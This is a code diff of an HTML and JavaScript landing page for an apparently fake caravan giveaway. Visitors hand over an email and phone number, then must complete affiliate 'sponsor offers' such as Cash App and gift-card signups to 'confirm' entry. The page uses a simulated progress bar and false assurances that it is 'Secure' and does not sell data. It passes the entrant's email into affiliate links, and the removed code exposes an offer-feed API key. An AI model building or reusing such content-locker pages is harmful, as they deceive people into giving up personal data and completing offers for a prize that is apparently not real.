+        <div id="terms" style="margin-top:12px;color:var(--muted)">By entering you agree to the <a href="#" style="text-decoration:underline;color:var(--gold)">Terms & Privacy</a>. Promotion not affiliated with Google.</div>
       </section>
+
+      <aside class="card prize" aria-label="Prize preview">
+        <div class="image-wrap" aria-hidden="false">
+          <picture>
+            <!-- NOTE: If you have real optimized images, replace URLs below -->
+            <source type="image/webp" srcset="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg 480w" sizes="100vw">
+            <img src="https://i.postimg.cc/KYLZJD4N/frankia-now-peach-g24-01.jpg" alt="Luxury Caravan" loading="lazy">
+          </picture>
+        </div>
+
+        <div style="font-weight:700;font-size:18px">2024 Premium Luxury Caravan</div>
+        <div class="small" style="color:var(--muted);margin-top:4px">Modern amenities • Sleeps 6</div>
+        <div class="value-bubble" style="margin-top:10px">VALUE: $45,000</div>
+        <div style="margin-top:12px" class="small">🔒 Secure • ⏱ Fast • 🎟 Instant entry</div>
+      </aside>
     </main>
 
-    <!-- FOOTER -->
-    <footer id="terms">
-      © 2025 Your CPA Business. All rights reserved.<br>
-      This promotion is not sponsored, endorsed, administered by, or associated with Google or any social media platform.
-    </footer>
+    <footer style="text-align:center;margin-top:18px;color:var(--muted)"><small>© 2025 Your CPA Business</small></footer>
   </div>
 
-  <!-- EMAIL MODAL -->
-  <div id="modalBack" class="modal-back" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="lockerTitle">
-    <div class="modal" role="document">
-      <div class="modal-header">
-        <div>
-          <div class="modal-title" id="lockerTitle">Confirm your entry</div>
-          <div class="modal-subtitle">Step 1 of 2 · Add your contact details</div>
-        </div>
-        <button id="closeModal" class="btn-ghost" type="button">Close</button>
+  <!-- sticky mobile CTA -->
+  <button id="stickyCTA" class="sticky-cta" aria-label="Enter giveaway">Enter & Start →</button>
+
+  <!-- Modal / locker -->
+  <div id="modalBack" class="modal-back" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document" aria-labelledby="modalTitle">
+      <div style="display:flex;justify-content:space-between;align-items:center">
+        <h3 id="modalTitle">Quick Verification — Step 1</h3>
+        <button id="closeBtn" class="btn-ghost" aria-label="close">Close</button>
       </div>
-      <div class="modal-body">
-        <p>
-          Enter your email so we can contact you if you win. On the next screen, you’ll see a list of
-          trusted sponsor offers. Complete <strong>one quick registration</strong> (usually 1–3 minutes)
-          and your entry is confirmed.
-        </p>
+      <p class="small">Enter your email to save your spot. You'll then be shown sponsor offers — complete one quick email registration (~30–90s) to confirm your entry.</p>
 
-        <label class="form-label" for="leadEmail">Email address *</label>
-        <input id="leadEmail" type="email" class="field" placeholder="you@example.com" autocomplete="email" inputmode="email" required>
+      <label class="small" for="leadEmail" style="margin-top:12px">Email</label>
+      <input id="leadEmail" type="email" placeholder="you@example.com" autocomplete="email" inputmode="email">
 
-        <label class="form-label" for="leadPhone">Phone number (optional)</label>
-        <input id="leadPhone" type="tel" class="field" placeholder="+1 555 555 5555" autocomplete="tel" inputmode="tel">
+      <label class="small" for="leadPhone" style="margin-top:8px">Phone (optional)</label>
+      <input id="leadPhone" type="tel" placeholder="+1 555 555 5555" autocomplete="tel" inputmode="tel">
 
-        <div style="margin-top: 12px;">
-          <button id="saveLead" class="btn-ghost" style="width:100%; border-color: var(--primary); color: var(--primary-dark);">
-            Continue to offers →
-          </button>
-        </div>
-
-        <div class="modal-footer-note">
-          🔒 We only use your details to manage this giveaway and contact you about your entry. Your
-          information is stored securely and isn’t sold to third parties.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <!-- LOCKER MODAL -->
-  <div class="locker-modal" id="lockerModal">
-    <div class="locker-card">
-      <button class="locker-close" type="button" onclick="closeLocker()">
-        <i class="fas fa-times"></i>
-      </button>
-
-      <div class="locker-header">
-        <div class="locker-img">
-          <img src="https://i.postimg.cc/Nj2Yjk8w/frankia-now-sun-g24-01-630x420.jpg" alt="Caravan prize">
-        </div>
-        <div class="locker-title">Step 2 of 2 · Choose a sponsor offer</div>
-        <div class="locker-badge">
-          <i class="fas fa-shield-alt"></i>
-          Secure entry verified
-        </div>
+      <div class="form-row" style="margin-top:12px">
+        <button id="saveContinue" class="btn-primary" style="flex:1">Save & Continue</button>
+        <button id="openOffers" class="btn-ghost" style="width:120px">Offers</button>
       </div>
 
-      <div class="locker-content">
-        <div class="locker-instructions">
-          To confirm you’re a real person and finalize your entry, choose
-          <strong>one offer below</strong> and complete the quick signup on our partner’s page.
-        </div>
-        <div class="locker-note">
-          If one offer doesn’t open or complete correctly, simply try another. Use real information so
-          your entry is counted.
-        </div>
-
-        <div class="offers-title">Available sponsor offers</div>
-        <div id="offersList" class="loading-offers">
-          <i class="fas fa-spinner"></i>
-          <span>Loading offers…</span>
-        </div>
+      <div id="progressWrap" class="progress" style="display:none;">
+        <span id="progressBar" style="width:0%"></span>
       </div>
+
+      <div id="offers" class="offers" aria-live="polite">
+        <div class="small" style="margin-top:10px">Choose an offer and complete its email registration to confirm your entry:</div>
+        <div id="offersList" style="margin-top:8px"></div>
+      </div>
+
+      <div style="margin-top:12px" class="small">We only use your info to confirm the entry and for legitimate follow-up. We do not sell your data.</div>
     </div>
   </div>
 
   <script>
-    const WEBHOOK_URL = "";
-    const SUB1_VALUE = "caravan";
-    const LOCKER_API_URL =
-      'https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id=504359&api_key=3b17a09c1ca2bba2d52ffadab4894374&s1='
-      + encodeURIComponent(SUB1_VALUE) + '&s2=';
+    // CONFIG: replace WEBHOOK_URL and SPONSORS with your values
+    const WEBHOOK_URL = ""; // e.g. "https://hooks.zapier.com/hooks/catch/XXXXX/YYYYY"
+    const SPONSORS = [
+      { title: "CTConnect — Cash App", url: "https://smrturl.co/a/sac7b66fcac/663?s1=" },
+      { title: "CTConnect — Nike GiftCard", url: "https://smrturl.co/a/sac7b66fcac/14565?s1=" }
+    ];
 
-    let allOffers = [];
-    let currentLead = null;
-
-    const enterGif = document.getElementById('enterGif');
+    // Elements
+    const openModalBtn = document.getElementById('openModalBtn');
+    const stickyCTA = document.getElementById('stickyCTA');
     const modalBack = document.getElementById('modalBack');
-    const closeModal = document.getElementById('closeModal');
-    const saveLead = document.getElementById('saveLead');
+    const closeBtn = document.getElementById('closeBtn');
+    const saveContinue = document.getElementById('saveContinue');
+    const openOffers = document.getElementById('openOffers');
     const leadEmail = document.getElementById('leadEmail');
     const leadPhone = document.getElementById('leadPhone');
+    const progressWrap = document.getElementById('progressWrap');
+    const progressBar = document.getElementById('progressBar');
+    const offers = document.getElementById('offers');
+    const offersList = document.getElementById('offersList');
     const howBtn = document.getElementById('howBtn');
 
-    function setBodyScrollLocked(isLocked) {
-      if (isLocked) {
-        const scrollY = window.scrollY || document.documentElement.scrollTop;
-        document.body.dataset.scrollY = scrollY;
-        document.body.classList.add('scroll-locked');
-        document.body.style.top = `-${scrollY}px`;
-      } else {
-        const stored = parseInt(document.body.dataset.scrollY || '0', 10);
-        document.body.classList.remove('scroll-locked');
-        document.body.style.top = '';
-        window.scrollTo(0, stored);
-      }
+    // Utility
+    function isEmail(v){ return typeof v==='string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()); }
+    function postJSON(url, body){ return fetch(url, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); }
+    function appendS1(url,email){ try{ const u=new URL(url); if(!u.searchParams.get('s1')) u.searchParams.set('s1', encodeURIComponent(email)); return u.toString(); }catch(e){ return url + encodeURIComponent(email); } }
+    function openInNewTab(url){ try{ const a=document.createElement('a'); a.href=url; a.target='_blank'; a.rel='noopener noreferrer'; document.body.appendChild(a); a.click(); document.body.removeChild(a); }catch(e){ window.open(url,'_blank','noopener'); } }
+
+    // Modal functions
+    function showModal(){ modalBack.style.display='flex'; modalBack.setAttribute('aria-hidden','false'); document.body.style.overflow='hidden'; setTimeout(()=> leadEmail.focus(),220); }
+    function hideModal(){ modalBack.style.display='none'; modalBack.setAttribute('aria-hidden','true'); document.body.style.overflow='auto'; resetOffersUI(); }
+
+    openModalBtn && openModalBtn.addEventListener('click', showModal);
+    stickyCTA && stickyCTA.addEventListener('click', showModal);
+    closeBtn && closeBtn.addEventListener('click', hideModal);
+    howBtn && howBtn.addEventListener('click', ()=> alert('Enter your email → choose an offer → complete the sponsor registration (30–90s) to confirm entry.'));
+
+    // Clicking backdrop closes
+    modalBack.addEventListener('click', (e)=> { if(e.target === modalBack) hideModal(); });
+    document.addEventListener('keydown', (e)=> { if(e.key === 'Escape' && modalBack.style.display === 'flex') hideModal(); });
+
+    // Save lead and show offers
+    saveContinue.addEventListener('click', async ()=>{
+      const email = (leadEmail.value||'').trim();
+      const phone = (leadPhone.value||'').trim();
+      if(!isEmail(email)){ leadEmail.focus(); leadEmail.style.borderColor='#ff7a43'; return; }
+      leadEmail.style.borderColor='';
+
+      const lead = { email, phone, ts: new Date().toISOString(), page: location.href };
+      try{ localStorage.setItem('caravan_lead', JSON.stringify(lead)); }catch(e){}
+      if(WEBHOOK_URL){ postJSON(WEBHOOK_URL, Object.assign({}, lead, { event:'lead_saved' })).catch(()=>{}); }
+
+      // show progress then offers
+      showProgressThenOffers();
+    });
+
+    openOffers && openOffers.addEventListener('click', ()=>{
+      const raw = localStorage.getItem('caravan_lead');
+      if(!raw && !confirm('We recommend saving your email first so your entry is credited. Open offers without saving?')) return;
+      renderOffers();
+      offers.style.display='block';
+    });
+
+    function showProgressThenOffers(){
+      progressWrap.style.display='block';
+      offers.style.display='none';
+      progressBar.style.width='0%';
+      let p=0;
+      const t=setInterval(()=>{ p += 12 + Math.random()*18; if(p>100)p=100; progressBar.style.width = p+'%'; if(p>=100){ clearInterval(t); progressWrap.style.display='none'; renderOffers(); offers.style.display='block'; } }, 140);
     }
 
-    function isEmail(e) {
-      return typeof e === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e.trim());
-    }
-
-    function postJSON(url, body) {
-      return fetch(url, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(body)
+    function renderOffers(){
+      offersList.innerHTML='';
+      SPONSORS.forEach((s,idx)=>{
+        const row = document.createElement('div');
+        row.className='offer';
+        row.innerHTML = `<div><div style="font-weight:700">${s.title}</div><div style="font-size:13px;color:var(--muted)">Email registration • Avg 1–3 min</div></div><div style="display:flex;gap:8px;align-items:center"><div style="font-size:12px;color:var(--muted)">${idx===0?'Recommended':'Popular'}</div><div style="background:linear-gradient(90deg,#00e5ff,#0099ff);color:#000;padding:8px 10px;border-radius:999px;font-weight:700">Open</div></div>`;
+        row.addEventListener('click', ()=> selectOffer(s));
+        offersList.appendChild(row);
       });
     }
 
-    // URL params
-    function getUrlParameter(name) {
-      name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
-      const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
-      const results = regex.exec(location.search);
-      return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    async function selectOffer(sponsor){
+      let lead = null;
+      try{ lead = JSON.parse(localStorage.getItem('caravan_lead')||'null'); }catch(e){ lead=null; }
+      if(!lead || !isEmail(lead.email)){ alert('Please save your email first so your entry is credited.'); return; }
+
+      // Send lead+offer to webhook (optional) - non-blocking
+      if(WEBHOOK_URL){ postJSON(WEBHOOK_URL, Object.assign({}, lead, { event:'offer_click', offer: sponsor.title, offer_url: sponsor.url, ts: new Date().toISOString() })).catch(()=>{}); }
+
+      // Append s1 param if possible
+      const redirect = appendS1(sponsor.url, lead.email);
+      openInNewTab(redirect);
+
+      setTimeout(()=>{ alert('Offer opened in a new tab. Complete the sponsor registration to confirm your entry.'); hideModal(); }, 700);
     }
 
-    let clickId = getUrlParameter('clickid') || getUrlParameter('click_id') || '';
-    let transactionId = getUrlParameter('transaction_id') || '';
-    let urlParams = {};
-    const urlSearchParams = new URLSearchParams(window.location.search);
-    for (const [key, value] of urlSearchParams) {
-      urlParams[key] = value;
-    }
+    function resetOffersUI(){ progressWrap.style.display='none'; progressBar.style.width='0%'; offers.style.display='none'; offersList.innerHTML=''; }
 
-    async function fetchOffers() {
-      try {
-        const apiUrl = LOCKER_API_URL + encodeURIComponent(urlParams.sub2 || urlParams.s2 || '');
-        const response = await fetch(apiUrl);
-        const data = await response.json();
-        if (data && data.offers && Array.isArray(data.offers)) {
-          allOffers = data.offers;
-        } else if (Array.isArray(data)) {
-          allOffers = data;
-        }
-      } catch (error) {
-        console.error('Error fetching offers:', error);
-        allOffers = [];
-      }
-    }
+    // Restore saved lead
+    (function restore(){
+      try{ const raw = localStorage.getItem('caravan_lead'); if(raw){ const parsed = JSON.parse(raw); if(parsed.email) leadEmail.value = parsed.email; if(parsed.phone) leadPhone.value = parsed.phone; } }catch(e){}
+    })();
 
-    function displayOffers() {
-      const offersList = document.getElementById('offersList');
-
-      if (!allOffers || allOffers.length === 0) {
-        offersList.className = 'no-offers';
-        offersList.textContent = 'No offers are available at the moment. Please try again shortly.';
-        return;
-      }
-
-      const offersToShow = allOffers.slice(0, 4);
-      offersList.className = '';
-      offersList.innerHTML = '';
-
-      offersToShow.forEach((offer, index) => {
-        const button = document.createElement('button');
-        button.className = 'offer-button';
-
-        const offerImage = offer.network_icon || offer.image || offer.logo || offer.icon || offer.thumbnail || 'https://via.placeholder.com/40/36d6c7/041726?text=Offer';
-        const offerText = offer.anchor || offer.name || offer.title || `Offer ${index + 1}`;
-
-        button.innerHTML = `
-          <img src="${offerImage}" alt="${offerText}" class="offer-logo"
-               onerror="this.src='https://via.placeholder.com/40/36d6c7/041726?text=Offer'">
-          <span class="offer-text">${offerText}</span>
-        `;
-
-        let offerUrl = offer.url || offer.link || '#';
-        if (offerUrl !== '#') {
-          const trackingParams = {};
-          trackingParams.sub1 = SUB1_VALUE;
-
-          if (urlParams.sub2 || urlParams.s2) trackingParams.sub2 = urlParams.sub2 || urlParams.s2;
-          if (urlParams.sub3 || urlParams.s3) trackingParams.sub3 = urlParams.sub3 || urlParams.s3;
-          if (urlParams.sub4 || urlParams.s4) trackingParams.sub4 = urlParams.sub4 || urlParams.s4;
-          if (urlParams.sub5 || urlParams.s5) trackingParams.sub5 = urlParams.sub5 || urlParams.s5;
-          if (clickId || transactionId) {
-            trackingParams.clickid = clickId || transactionId;
-            trackingParams.transaction_id = transactionId || clickId;
-          }
-
-          try {
-            const urlObj = new URL(offerUrl);
-            Object.keys(trackingParams).forEach(key => {
-              if (trackingParams[key]) urlObj.searchParams.set(key, trackingParams[key]);
-            });
-            offerUrl = urlObj.toString();
-          } catch (e) {
-            const separator = offerUrl.includes('?') ? '&' : '?';
-            const paramString = Object.keys(trackingParams)
-              .filter(key => trackingParams[key])
-              .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(trackingParams[key])}`)
-              .join('&');
-            offerUrl = offerUrl + separator + paramString;
-          }
-        }
-
-        button.onclick = () => openOffer(offerUrl, offer);
-        offersList.appendChild(button);
-      });
-    }
-
-    function openOffer(url, offer) {
-      if (url && url !== '#') {
-        if (WEBHOOK_URL && currentLead) {
-          postJSON(WEBHOOK_URL, Object.assign({}, currentLead, {
-            event: 'offer_click',
-            offer: offer ? (offer.anchor || offer.name || offer.title) : 'Unknown',
-            offer_url: url,
-            sub1: SUB1_VALUE,
-            ts: new Date().toISOString()
-          })).catch(() => {});
-        }
-        window.open(url, '_blank', 'noopener,noreferrer');
-      }
-    }
-
-    function openLocker() {
-      const modal = document.getElementById('lockerModal');
-      fetchOffers().then(displayOffers);
-      modal.classList.add('active');
-      setBodyScrollLocked(true);
-    }
-
-    function closeLocker() {
-      const modal = document.getElementById('lockerModal');
-      modal.classList.remove('active');
-      setBodyScrollLocked(false);
-    }
-
-    function showModal() {
-      modalBack.style.display = 'flex';
-      modalBack.setAttribute('aria-hidden', 'false');
-      setBodyScrollLocked(true);
-      setTimeout(() => leadEmail && leadEmail.focus(), 200);
-    }
-
-    function hideModal() {
-      modalBack.style.display = 'none';
-      modalBack.setAttribute('aria-hidden', 'true');
-      setBodyScrollLocked(false);
-    }
-
-    // Event listeners
-    enterGif && enterGif.addEventListener('click', showModal);
-    closeModal && closeModal.addEventListener('click', hideModal);
-
-    howBtn && howBtn.addEventListener('click', () => {
-      alert(
-        'HOW IT WORKS:\n\n' +
-        '1. Tap the big animated button.\n' +
-        '2. Add your email (and optional phone) so we can contact you.\n' +
-        '3. Choose one sponsor offer and complete the quick registration (1–3 minutes).\n\n' +
-        'After completing one offer successfully, your entry is confirmed. No purchase required.'
-      );
-    });
-
-    modalBack.addEventListener('click', (e) => {
-      if (e.target === modalBack) hideModal();
-    });
-
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape') {
-        if (modalBack.style.display === 'flex') {
-          hideModal();
-        } else if (document.getElementById('lockerModal').classList.contains('active')) {
-          closeLocker();
+    // Sticky CTA: hide when keyboard opens (mobile)
+    (function stickyBehavior(){
+      const sticky = document.getElementById('stickyCTA');
+      function update(){
+        if(window.visualViewport){
+          if(window.visualViewport.height < screen.availHeight * 0.65) sticky.style.display='none';
+          else sticky.style.display = window.matchMedia('(max-width:980px)').matches ? 'block' : 'none';
+        } else {
+          sticky.style.display = window.matchMedia('(max-width:980px)').matches ? 'block' : 'none';
         }
       }
-    });
+      window.addEventListener('resize', update);
+      window.addEventListener('orientationchange', update);
+      window.addEventListener('focusin', update);
+      window.addEventListener('focusout', update);
+      update();
+    })();
 
-    saveLead && saveLead.addEventListener('click', () => {
-      const email = (leadEmail.value || '').trim();
-      const phone = (leadPhone.value || '').trim();
+    // auto open ?open=1
+    (function autoOpen(){ try{ const u = new URL(location.href); if(u.searchParams.get('open')==='1') showModal(); }catch(e){} })();
 
-      if (!isEmail(email)) {
-        leadEmail.classList.add('error');
-        leadEmail.focus();
-        setTimeout(() => leadEmail.classList.remove('error'), 1800);
-        return;
-      }
+    // expose helper for debug
+    function showModal(){ modalBack.style.display='flex'; modalBack.setAttribute('aria-hidden','false'); document.body.style.overflow='hidden'; setTimeout(()=> leadEmail.focus(),220); }
+    function hideModal(){ modalBack.style.display='none'; modalBack.setAttribute('aria-hidden','true'); document.body.style.overflow='auto'; resetOffersUI(); }
+    window.__landing = { showModal, hideModal, renderOffers };
 
-      currentLead = {
-        email,
-        phone,
-        ts: new Date().toISOString(),
-        page: location.href
-      };
-
-      try {
-        localStorage.setItem('caravan_lead', JSON.stringify(currentLead));
-      } catch (e) {}
-
-      if (WEBHOOK_URL) {
-        postJSON(WEBHOOK_URL, Object.assign({}, currentLead, {event: 'lead_saved', sub1: SUB1_VALUE}))
-          .catch(() => {});
-      }
-
-      hideModal();
-      setTimeout(openLocker, 250);
-    });
-
-    document.getElementById('lockerModal').addEventListener('click', function(e) {
-      if (e.target === this) closeLocker();
-    });
-
-    window.closeLocker = closeLocker;
-    window.openOffer = openOffer;
-
-    document.addEventListener('DOMContentLoaded', () => {
-      fetchOffers().catch(err => {
-        console.error('Error pre-fetching offers:', err);
-      });
-
-      try {
-        const raw = localStorage.getItem('caravan_lead');
-        if (raw) {
-          const data = JSON.parse(raw);
-          if (data.email) leadEmail.value = data.email;
-          if (data.phone) leadPhone.value = data.phone;
-          currentLead = data;
-        }
-      } catch (e) {}
-
-      try {
-        const u = new URL(location.href);
-        if (u.searchParams.get('open') === '1') showModal();
-      } catch (e) {}
-    });
+    // wire sticky CTA click (element exists)
+    document.getElementById('stickyCTA')?.addEventListener('click', showModal);
   </script>
 </body>
 </html>
